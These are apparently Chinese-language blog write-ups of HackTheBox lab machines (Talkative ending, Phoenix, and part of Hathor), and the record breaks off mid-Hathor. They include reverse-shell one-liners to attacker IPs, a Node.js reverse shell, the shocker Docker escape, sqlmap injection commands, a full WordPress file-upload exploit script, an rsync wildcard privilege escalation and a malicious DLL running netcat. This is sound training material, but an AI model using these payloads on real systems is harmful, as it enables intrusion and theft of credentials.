http://10.10.11.155:3000/hooks/YemLLtCAsASjTYtF6/8zLfJzKrSodq2o7owhfdbFjwknGXmXE3mJbH9eeMzsxmuBmL reverse.js12345678const require = console.log.constructor('return process.mainModule.require')();var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);var client = new net.Socket();client.connect(4444, \"10.10.14.14\", function()&#123; client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;); docker逃逸 &amp; root flag gabrtv/shocker: Shocker / Docker Breakout PoChttps://github.com/gabrtv/shocker 没有curl和wget，还是通过base64写文件进去运行，自己修改c代码获取需要的文件内容： 123456789101112131415// get a FS reference from something mounted in from outsideif ((fd1 = open(\"/etc/hostname\", O_RDONLY)) &lt; 0) die(\"[-] open\");if (find_handle(fd1, \"/root/root.txt\", &amp;root_h, &amp;h) &lt;= 0) die(\"[-] Cannot find valid handle!\");# localgcc shocker.c -o shockerbase64 shocker# targetecho xxx | base64 -d &gt; shockerchmod +x shocker./shocker shadow12root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3&#x2F;S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7::: 参考资料 CsEnox/CVE-2021-22911: Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1https://github.com/CsEnox/CVE-2021-22911 gabrtv/shocker: Shocker / Docker Breakout PoChttps://github.com/gabrtv/shocker Talkative machine discussion | BreachForumshttps://breached.co/Thread-Talkative-machine-discussion Hack-The-Box-walkthrough[talkactive] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2022/04/10/talkactive/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Phoenix - HackTheBox","slug":"Phoenix-HackTheBox","date":"2022-04-21T04:48:44.000Z","updated":"2022-06-27T07:15:03.805Z","comments":true,"path":"2022/04/21/Phoenix-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/21/Phoenix-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/448 10.10.11.149 端口扫描22,80,443: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.149Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 14:20 CSTNmap scan report for 10.10.11.149Host is up (0.20s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 9d:f3:87:cd:34:75:83:e0:3f:50:d8:39:c6:a5:32:9f (RSA)| 256 ab:61:ce:eb:ed:e2:86:76:e9:e1:52:fa:a5:c7:7b:20 (ECDSA)|_ 256 26:2e:38:ca:df:72:d4:54:fc:75:a4:91:65:cc:e8:b0 (ED25519)80/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Did not follow redirect to https://phoenix.htb/443/tcp open ssl/http Apache httpd| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US| Not valid before: 2022-02-15T20:08:43|_Not valid after: 2032-02-13T20:08:43|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache| tls-alpn:| h2|_ http/1.1| http-robots.txt: 1 disallowed entry|_/wp-admin/|_http-title: Did not follow redirect to https://phoenix.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 80.21 seconds 80/443需要加hosts 110.10.11.149 phoenix.htb wordpress &amp;&amp; Forumdetails里read blog，可以注册登录,是一个wordpress： 另外还有个forum，里面可以查看members得到一些用户名： Asgaros Forum直接查看源码可以知道forum是wp插件Asgaros Forum，1.15.12： 可以搜到相关漏洞： Asgaros Forum &lt; 1.15.13 - Unauthenticated SQL Injection WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1 sql注入注入点就是subscribe_topic，直接sqlmap一把梭(非常慢，2.6的评分(做的时候是这个评分)就是这么来的): 知道是wordpress直接去dump wp_users 了，再去跑表太费时间了,破解出来phoenix密码，但登录还有2FA 12345678sqlmap --url https://phoenix.htb/forum/?subscribe_topic=1 --level 3 --risk 3 --batchsqlmap --url https://phoenix.htb/forum/\\?subscribe_topic\\=1 --level 3 --risk 3 --batch --dbssqlmap --url https://phoenix.htb/forum/\\?subscribe_topic\\=1 --level 3 --risk 3 --batch -D wordpress -T wp_users --dumpsqlmap --url https://phoenix.htb/forum/\\?subscribe_topic\\=1 --level 3 --risk 3 --batch -D wordpress -T wp_users -C user_login,user_pass --dump --threads 10sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtphoenix ： phoenixthefirebird14 所以需要其他方式，例如通过插件,利用插件漏洞： 1sqlmap --url https://phoenix.htb/forum/\\?subscribe_topic\\=1 --level 3 --risk 3 --batch -D wordpress -T wp_options -C option_value --where \"option_name='active_plugins'\" --dump 其中一个插件搜到相关漏洞： Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/50287 webshell利用插件漏洞获取shell，因为是https，需要修改exp， 在请求中添加verify=False,另外shell需要phtml格式： reverse shellwebshell执行命令获取reverse shell： 1https:&#x2F;&#x2F;phoenix.htb&#x2F;wp-admin&#x2F;shell.phtml?cmd&#x3D;bash%20-c%20&#39;exec%20bash%20-i%20%26%3E&#x2F;dev&#x2F;tcp&#x2F;10.10.14.13&#x2F;4444%20%3C%261&#39; databases123available databases [2]:[*] information_schema[*] wordpress wp_users123456789101112Database: wordpressTable: wp_users[5 entries]+------------+------------------------------------+| user_login | user_pass |+------------+------------------------------------+| john | $P$B8eBH6QfVODeb&#x2F;gYCSJRvm9MyRv7xz. || Phoenix | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh&#x2F;gc. || Jane | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 || Jsmith | $P$BV5kUPHrZfVDDWSkvbt&#x2F;Fw3Oeozb.G. || Jack | $P$BzalVhBkVN.6ii8y&#x2F;nbv3CTLbC0E9e. |+------------+------------------------------------+ exp.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload# Google Dork: inurl:/wp-content/plugins/download-from-files# Date: 10/09/2021# Exploit Author: spacehen# Vendor Homepage: https://wordpress.org/plugins/download-from-files/# Version: &lt;= 1.48# Tested on: Ubuntu 20.04.1 LTS (x86)import os.pathfrom os import pathimport jsonimport requests;import sysdef print_banner(): print(\"Download From Files &lt;= 1.48 - Arbitrary File Upload\") print(\"Author -&gt; spacehen (www.github.com/spacehen)\")def print_usage(): print(\"Usage: python3 exploit.py [target url] [php file]\") print(\"Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)\")def vuln_check(uri): response = requests.get(uri,verify=False) raw = response.text if (\"Sikeres\" in raw): return True; else: return False;def main(): print_banner() if(len(sys.argv) != 3): print_usage(); sys.exit(1); base = sys.argv[1] file_path = sys.argv[2] ajax_action = 'download_from_files_617_fileupload' admin = '/wp-admin/admin-ajax.php'; uri = base + admin + '?action=' + ajax_action ; check = vuln_check(uri); if(check == False): print(\"(*) Target not vulnerable!\"); sys.exit(1) if( path.isfile(file_path) == False): print(\"(*) Invalid file!\") sys.exit(1) files = &#123;'files[]' : open(file_path)&#125; data = &#123; \"allowExt\" : \"php4,phtml\", \"filesName\" : \"files\", \"maxSize\" : \"1000\", \"uploadDir\" : \".\" &#125; print(\"Uploading Shell...\"); response = requests.post(uri, files=files, data=data , verify=False) file_name = path.basename(file_path) if(\"ok\" in response.text): print(\"Shell Uploaded!\") if(base[-1] != '/'): base += '/' print(base + \"wp-admin/\" + file_name); else: print(\"Shell Upload Failed\") sys.exit(1)main(); 信息搜集 wp-config.php中获得数据库密码： 1234567define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;&lt;++32%himself%FIRM%section%32++&gt;&#39; ); /etc/passwd中可以发现john用户，前面得到的hash破解出来的他的密码 superphoenix ,但直接切换也存在2FA： 查看/etc/pam.d/sshd配置，可以发现 1auth [success&#x3D;1 default&#x3D;ignore] pam_access.so accessfile&#x3D;&#x2F;etc&#x2F;security&#x2F;access-local.conf 查看配置，发现只允许10.11.2.13/24 ssh： 所以是需要通过隧道，从eth0这个ip进行ssh user flag打通隧道，之后ssh连接 123456789# local./chisel_1.7.0-rc7_darwin_amd64 server -p 6969 --reverse# target./chisel_1.7.6_linux_amd64 client 10.10.14.13:6969 R:2222:10.11.12.13:22# localssh editor@127.0.0.1 -p 2222superphoenix 提权信息/usr/local/bin里有个cron.sh.x 手动尝试运行，结合pspy64监控，可以发现调用rsync，使用通配符 1rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/ 就是会通过rsync同步根目录backups里的文件，利用方式是常规gtfobins： rsync | GTFOBinshttps://gtfobins.github.io/gtfobins/rsync/ 提权 &amp;&amp; root flag 注意文件名需要有后缀，因为rsync命令用的是 *.* 123456789cd /backups/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.13/4444 0&gt;&amp;1L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo=echo \"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo= | base64 -d | bash\" &gt; shell.miaotouch -- \"-e sh shell.miao\"chmod +x shell.miaochmod +x -- '-e sh shell.miao' ( 这里图文件名有问题，失败的，懒得换新图了，注意前面说的，文件名需要有后缀) 等待执行(3分钟自动执行一次)，我们自定义的命令成功被运行，得到root shell： shadow123root:$6$U6DRf4846rMqwA5E$Bwo3RxRA1t15bx6xvX8fVZ1cNfMoFVkpwyoWcK2gz3HRX16&#x2F;d.zqHlQI68v8drjuFWucpXhRYpIbnhg35.Vjc0:18944:0:99999:7:::phoenix:$6$gLLB4KeGdb5Hnsc2$t6EYvvoh1DnVbPUbySB.0IVNgQicWBhS87fatD7umPj9PAKs8ZDvwHcrwp.dV&#x2F;ZFnQDXCOc81pGrLcKyRuUtl0:19046:0:99999:7:::editor:$6$CoywBsVPjctrApY9$P16ZwO5otTjkUm1B8kz8aKpgvC0mEK6g9Mq2wexdaRdF4kT3LuSM56R3BbJm28fp&#x2F;39vUGJBRbPyw8r34PO1u&#x2F;:19039:0:99999:7::: 参考资料 Asgaros Forum &lt; 1.15.13 - Unauthenticated SQL Injection WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1 Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/50287 rsync | GTFOBinshttps://gtfobins.github.io/gtfobins/rsync/ HTB: Phoenix – Syn’s writeupshttps://synisl33t.com/2022/03/08/htb-phoenix/ Hack-The-Box-walkthrough[phoenix] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2022/03/24/phoenix/ HTB phoenix discussion | BreachForumshttps://breached.co/Thread-HTB-phoenix-discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Hathor - HackTheBox","slug":"Hathor-HackTheBox","date":"2022-04-16T06:14:18.000Z","updated":"2022-11-21T06:15:25.883Z","comments":true,"path":"2022/04/16/Hathor-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/16/Hathor-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/459 10.10.11.147 端口扫描80和常规windows域端口： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859$ nmap -sC -sV -Pn 10.10.11.147Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 12:27 CSTNmap scan report for 10.10.11.147Host is up (0.19s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE| http-robots.txt: 29 disallowed entries (15 shown)| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/|_http-server-header: Microsoft-IIS/10.0|_http-title: Home - mojoPortal88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-21 04:29:39Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=hathor.windcorp.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb| Not valid before: 2022-03-18T07:51:40|_Not valid after: 2023-03-18T07:51:40445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=hathor.windcorp.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb| Not valid before: 2022-03-18T07:51:40|_Not valid after: 2023-03-18T07:51:403268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-11-21T04:31:02+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=hathor.windcorp.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb| Not valid before: 2022-03-18T07:51:40|_Not valid after: 2023-03-18T07:51:403269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=hathor.windcorp.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb| Not valid before: 2022-03-18T07:51:40|_Not valid after: 2023-03-18T07:51:40|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 311:|_ Message signing enabled and required| smb2-time:| date: 2022-11-21T04:30:26|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 184.70 seconds 80一个mojoPortal： mojoPortal默认账号密码登录： Admin Password Reset - mojoPortalhttps://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password. Administration -&gt; System Information中得到版本信息： 123456789101112131415mojoPortal Version 2.7.0.0 MSSQLFeature Versions Feature Schema Versionblog 2.6.1.9contactform 0.0.0.6eventcalendar 0.0.0.6feed-manager 1.0.1.1forums 2.2.0.5imagegallery 0.0.0.8kdmediaplayer 1.0.0.1linksmodule 1.0.0.9pollfeature-byChristianFredh 0.0.0.5sharedfiles 1.1.0.0superflexi 0.0.1.7surveyfeature 1.9.0.0 webshellgithub issue中找到相关漏洞，用于获取webshell： Vulnerabilities in Legacy File Manager · Issue #146 · i7MEDIA/mojoportalhttps://github.com/i7MEDIA/mojoportal/issues/146 有一点区别就是，issue里是重命名成aspx，这里是复制成aspx文件 路径可以直接在首页根据图片路径得到： Firewall and AppLockerwebshell执行命令会发现存在限制，查看防火墙和AppLocker设置： Enumerating Firewall And AppLocker Rules [Hathor - HackTheBox] - YouTubehttps://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf 123powershell.exe -c \"Get-NetFirewallRule -PolicyStore ActiveStore | where &#123; $_.Action -eq \\\"Block\\\" &#125;\"powershell.exe -c \"Get-AppLockerPolicy -Effective -Xml\" AppLocker 规则 Appx - 签名 dll Microsoft签名 在Program Files 和 Windows目录中 由admin组运行 C:\\share\\scripts\\7-zip64.dll或者C:\\Get-bADpasswords\\PSI\\Psi_x64.dll exe 明确阻止已知的AppLocker 绕过甚至包括由 Microsoft 签名MSDT.exe，PRESENTATIONHOST.exeMSHTA.exe，`MSBUILD.exe``INSTALLUTIL.exe 允许由 administrator@windcorp.com、AutoIt 或 Microsoft 签名（如果不在上面） 显式阻止已知路径，如%SYSTEM#2%\\Tasks:*、%SYSTEM32%\\regvr32、%SYSTEM32%\\spool\\drivers\\color:*等。 在 Program Files 和 Windows 文件夹中 由admin组运行 C:\\share\\Bginfo64.exe msi 签名 在C:\\Windows\\Installer目录中 由admin组运行 scripts 由 administrator@windcorp.htb 签名 在 Program Files 和 Windows 文件夹中 由admin组运行 C:\\script\\login.cmd Get-bADpasswords枚举目录文件，C盘发现Get-bADpasswords目录，里面一些文件： 这里是一个副本 improsec/Get-bADpasswords: Get insights into the actual strength and quality of passwords in Active Directory.https://github.com/improsec/Get-bADpasswords run.vbs不是那个 repo 的一部分，查看这个文件,获得有效签名： Get-bADpasswords.ps1在脚本的顶部有一个配置部分： 12345678...$log_filename = \".\\Accessible\\Logs\\log_$domain_name-$current_timestamp.txt\"$csv_filename = \".\\Accessible\\CSVs\\exported_$domain_name-$current_timestamp.csv\"$write_to_log_file = $true$write_to_csv_file = $true$write_hash_to_logs = $true... $write_hash_to_logs很有趣，因为它暗示它可能正在记录错误的密码。 Accessible\\CSVs继续查看Accessible\\CVSs目录，在其中最新的一个文件中BeatriceMill用户的hash，破解出来密码： 1234567type c:\\Get-bADpasswords\\Accessible\\CSVs\\exported_windcorp-13102022-210946.csvActivity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'# 明文!!!!ilovegood17 run.vbs12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273Set WshShell = CreateObject(\"WScript.Shell\")Command = \"eventcreate /T Information /ID 444 /L Application /D \" &amp; _ Chr(34) &amp; \"Check passwords\" &amp; Chr(34)WshShell.Run Command'' SIG '' Begin signature block'' SIG '' MIIIkgYJKoZIhvcNAQcCoIIIgzCCCH8CAQExDzANBglg'' SIG '' hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor'' SIG '' BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC'' SIG '' AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg'' SIG '' V4iIgvjS/tzbdg7yzPOhQtBxr63sSQYGiJME4+J1oz6g'' SIG '' ggXTMIIFzzCCBLegAwIBAgITIAAAAAdbcJwdN1cU7gAA'' SIG '' AAAABzANBgkqhkiG9w0BAQsFADBOMRMwEQYKCZImiZPy'' SIG '' LGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv'' SIG '' cnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0x'' SIG '' MB4XDTIyMTAxMjE4MzAyM1oXDTMyMTAwOTE4MzAyM1ow'' SIG '' VzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT'' SIG '' 8ixkARkWCHdpbmRjb3JwMQ4wDAYDVQQDEwVVc2VyczEW'' SIG '' MBQGA1UEAxMNQWRtaW5pc3RyYXRvcjCCASIwDQYJKoZI'' SIG '' hvcNAQEBBQADggEPADCCAQoCggEBAOCsWmgMuC3A7kFR'' SIG '' SV3ThIJHkRW+wg/h+YsgV4SLZ6fE8D1rZBx0MTLaNt8g'' SIG '' xyRiQNDCXRqERx1i3QpCjAbVWDEH7Kf4OTNVGMNg1QUL'' SIG '' JUi7nkB42SGVFW3Bs8sVzOC7p60dNs0YoDpX6thYNUje'' SIG '' AGm/UEHd/EiMf512l0ND01rh+HieEQR4p76OR1+qel3+'' SIG '' W9+J0RWybE90EAwxFlD6wnig0JyVimnWw0/8ZJ/pJtlg'' SIG '' QGGNX0WlebyC5RgwCfw2Edbm4LtqQ8vFKPk1G1SIniJn'' SIG '' A1pYhoMV5wi9QeZhH+FHgL+JHTzqcmxWhh6AuqZ2OEoN'' SIG '' EfUmmzPSeGtKK1UDFSUCAwEAAaOCApswggKXMD0GCSsG'' SIG '' AQQBgjcVBwQwMC4GJisGAQQBgjcVCILUznCD1qdohvWR'' SIG '' EYToiS+G+41kgSqBkDyC69BtAgFlAgEAMBMGA1UdJQQM'' SIG '' MAoGCCsGAQUFBwMDMA4GA1UdDwEB/wQEAwIHgDAbBgkr'' SIG '' BgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMDMB0GA1UdDgQW'' SIG '' BBSRtmNDqnEAXEVStyjbKqzLwRyUgzAfBgNVHSMEGDAW'' SIG '' gBTxjkqkbc2CsGldYvNjmn6LbnL2WTCB0gYDVR0fBIHK'' SIG '' MIHHMIHEoIHBoIG+hoG7bGRhcDovLy9DTj13aW5kY29y'' SIG '' cC1IQVRIT1ItQ0EtMSxDTj1oYXRob3IsQ049Q0RQLENO'' SIG '' PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp'' SIG '' Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2luZGNvcnAs'' SIG '' REM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/'' SIG '' YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q'' SIG '' b2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQGCCsGAQUF'' SIG '' BzAChoGnbGRhcDovLy9DTj13aW5kY29ycC1IQVRIT1It'' SIG '' Q0EtMSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vy'' SIG '' dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv'' SIG '' bixEQz13aW5kY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0'' SIG '' ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B'' SIG '' dXRob3JpdHkwNQYDVR0RBC4wLKAqBgorBgEEAYI3FAID'' SIG '' oBwMGmFkbWluaXN0cmF0b3JAd2luZGNvcnAuaHRiMA0G'' SIG '' CSqGSIb3DQEBCwUAA4IBAQAbp0/YFh2yKjHp2+vaPfOQ'' SIG '' t8bUtjIuiBDfXckT/a7+ym1UI+x38RIg+Uey77Ww9Oxy'' SIG '' Yg/xPQTU/JC+QNZTtDefWDknn/oXvL2QT/z9ox8vIOw6'' SIG '' TkCS2pdMAv6R27J1J3ba5Rhb1lAbIo++32ZnQbNWwAa7'' SIG '' DQcymBRy1o6L/jY0FFqY5aQcAcCoYm9S+FKivuQLu0eL'' SIG '' x3PuuviDtsWqO6qYwWSfkCOYGRzdVTgD/hUOC1GYMsRl'' SIG '' NFNbQKSDtZbcvkWPIZsa9Nww1FYUWOh5YiILwnyayuCr'' SIG '' pTVvmxla555SGRMLaCz6IMPevqXuhOGb+W/P/gAaop7d'' SIG '' d0VbnbPOfQTfMYICFzCCAhMCAQEwZTBOMRMwEQYKCZIm'' SIG '' iZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2lu'' SIG '' ZGNvcnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1D'' SIG '' QS0xAhMgAAAAB1twnB03VxTuAAAAAAAHMA0GCWCGSAFl'' SIG '' AwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAIoAKAAKEC'' SIG '' gAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYK'' SIG '' KwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARUwLwYJKoZI'' SIG '' hvcNAQkEMSIEIMAMrS4wO7Di3pqZtBcXNwHEE7EmF+k2'' SIG '' G6qrSRH1n28EMA0GCSqGSIb3DQEBAQUABIIBANNeMMbj'' SIG '' vGfNxmTbdqaeieDzad1W9KRj5aqQXOZjlM+pmmYvY+HG'' SIG '' SziQXTPxjiH2GmxHEky11VoM7A0YSgRhhDxRgoF6zYVg'' SIG '' ZQA+unmOZYg8Eas8azZkoEVD7e6119dqev6P5rpN+v7i'' SIG '' jjTCd0A8yyfY0P1x064sBd+G8mv0WerKyTf+Tk7m7HmJ'' SIG '' aU/U6guhCvE5ipk/3or0oT509OeDDqKijeL3wkIN+YGs'' SIG '' tM0sIX9xzrCdC3pUCznVu/16+8qCNF11kROH9UI5WNxW'' SIG '' nIc54rkc71MzZup+N0L5cxTDKnmUDW99XRcjwNeRGQdx'' SIG '' lQgfLUl5qzTK6aRKc/nPVHD+yyQ='' SIG '' End signature block SMB直接使用密码会发现NTLM被禁用，需要通过kerberos方式： 首先修改hosts： 110.10.11.147 hathor.windcorp.htb 修改配置文件，使用账号密码请求ticket，使用ticket继续去枚举smb： 12345kinit beatricemillklistsmbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k# orcrackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares Share share目录下发现AutoIt.exe和Bginfo64.exe，AutoIt.exe被applocker阻止，Bginfo64.exe是被允许的 share/scripts目录下是一个7Zip库和一堆AutoIt脚本,7-zip64.dll也在applocker的白名单中 12smbclient //hathor.windcorp.htb/share -U beatricemill@windcorp.htb -N -k smbclient //hathor.windcorp.htb/scripts -U beatricemill@windcorp.htb -N -k /etc/krb5.conf123456789[libdefaults] default_realm &#x3D; WINDCORP.HTB fcc-mit-ticketflags &#x3D; true[realms] WINDCORP.HTB &#x3D; &#123; kdc &#x3D; HATHOR.WINDCORP.HTB admin_server &#x3D; HATHOR.WINDCORP.HTB &#125; 7-zip64.dll枚举发现share目录下两个exe定时运行，其中AutoIt3_x64.exe的一个脚本7Zip.au3中调用了7-zip64.dll，我们可以通过smb覆盖dll来达到任意命令执行目的 1FOR &#x2F;L %i IN (0,1,1000) DO (tasklist &#x2F;FI &quot;imagename eq Bginfo64.exe&quot; | findstr &#x2F;v &quot;No tasks&quot; &amp; tasklist &#x2F;FI &quot;imagename eq AutoIt3_x64.exe&quot; | findstr &#x2F;v &quot;No tasks&quot; &amp; ping -n 2 127.0.0.1 &gt; NUL ) enum(这里开始就在云了) 这里因为存在杀软，需要自己写dll，通过dll的执行去进一步枚举信息，发现是GinaWild用户权限在定时运行exe，他是 ITDep 和 Protected Users 组的成员： 另一方遍，Bginfo64.exe。用户只能读/执行，但ITDep也可以写owner( WO)，也就是说ginawild可以改变owner 战略这里是0xdf的原文： Bginfo64.exe未被防火墙阻止，并且即使未从该路径签名，它也会在 AppLocker 中列入白名单以运行。我可以以 GinaWild 的身份运行 Dll，GinaWild 可以取得 Bginfo64.exe的所有权，然后对其进行修改。 我将制作一个新的 Dll 来： 拥有Bginfo64.exe. 更新权限，以便 GinaWild 具有完全控制权。 将nc64.exe我之前上传的复制到web目录下Bginfo64.exe。 调用nc64.exe以使用反向 shell 连接回我。 代码大概这样： 12345case DLL_PROCESS_ATTACH: system(\"cmd.exe /c takeown /F C:\\\\share\\\\Bginfo64.exe\"); system(\"cmd.exe /c cacls C:\\\\share\\\\Bginfo64.exe /E /G ginawild:F\"); system(\"cmd.exe /c copy C:\\\\inetpub\\\\wwwroot\\\\data\\\\sites\\\\1\\\\media\\\\nc64.exe C:\\\\share\\\\Bginfo64.exe\"); system(\"cmd.exe /c C:\\\\share\\\\Bginfo64.exe -e cmd 10.10.14.6 9003\"); GinaWild &amp; user flag执行后得到GinaWild shell和user flag 信息发现桌面一个快捷方式指向之前那个vbs 12c:\\Users\\Public\\Desktop&gt;powershell -c \"$sh = New-Object -ComObject WScript.Shell; $sh.CreateShortcut('.\\bAD Passwords.lnk').TargetPath\"C:\\Get-bADpasswords\\run.vbs GinaWild 的回收站中有文件,GinaWild 的 SID 以-2663结尾，回收站中查看发现3个证书文件： 1234567891011c:\\$Recycle.Bin\\S-1-5-21-3783586571-2109290616-3725730865-2663&gt;dir Volume in drive C has no label. Volume Serial Number is BE61-D5E0 Directory of c:\\$Recycle.Bin\\S-1-5-21-3783586571-2109290616-3725730865-266310/12/2022 08:26 PM 98 $IZIX7VV.pfx03/21/2022 03:37 PM 4,053 $RLYS3KF.pfx10/12/2022 07:43 PM 4,280 $RZIX7VV.pfx 3 File(s) 8,431 bytes 0 Dir(s) 9,232,101,376 bytes free 元数据文件是二进制格式，但我可以看到以前文件名的字符串： 12c:\\$Recycle.Bin\\S-1-5-21-3783586571-2109290616-3725730865-2663&gt;type $IZIX7VV.pfxўp#C:\\Users\\GinaWild\\Desktop\\cert.pfx 访问证书将3个证书文件复制到smb，下载下来查看，需要密码，破解出来证书密码： crackpkcs12/crackpkcs12: A multithreaded program to crack PKCS#12 files (p12 and pfx extensions)https://github.com/crackpkcs12/crackpkcs12 